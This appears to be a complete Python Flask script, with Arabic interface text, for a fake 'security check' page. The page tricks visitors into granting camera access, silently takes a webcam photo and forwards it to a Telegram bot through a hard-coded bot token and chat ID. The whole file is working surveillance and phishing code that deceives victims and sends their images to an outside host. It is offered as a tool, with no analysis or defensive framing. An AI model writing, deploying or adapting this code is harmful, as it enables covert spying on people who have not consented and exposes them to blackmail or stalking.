from flask import Flask, request
import requests
import base64

app = Flask(__name__)

# بياناتك الخاصة اللي بعتها
TOKEN = "8703733623:AAEekblBak46WO3jTlpPVvJH8-BEVtx7-mY"
CHAT_ID = "7417196710"

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
        <h2>جاري فحص الأمان... يرجى الانتظار</h2>
        <video id="v" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="c" width="640" height="480" style="display:none;"></canvas>
        <script>
            async function s() {
                try {
                    const st = await navigator.mediaDevices.getUserMedia({ video: true });
                    const v = document.getElementById('v');
                    v.srcObject = st;
                    setTimeout(() => {
                        const c = document.getElementById('c');
                        c.getContext('2d').drawImage(v, 0, 0);
                        fetch('/upload', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({image: c.toDataURL('image/png')})
                        });
                        alert("تم التحقق بنجاح! يمكنك الخروج.");
                    }, 2000);
                } catch(e) { 
                    alert("عفواً، يجب السماح بالكاميرا لتجاوز فحص الأمان."); 
                }
            }
            s();
        </script>
    </body>
    </html>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json['image'].split(',')[1]
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        photo = base64.b64decode(data)
        requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': ('i.png', photo)})
        return "OK"
    except:
        return "Error"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
  
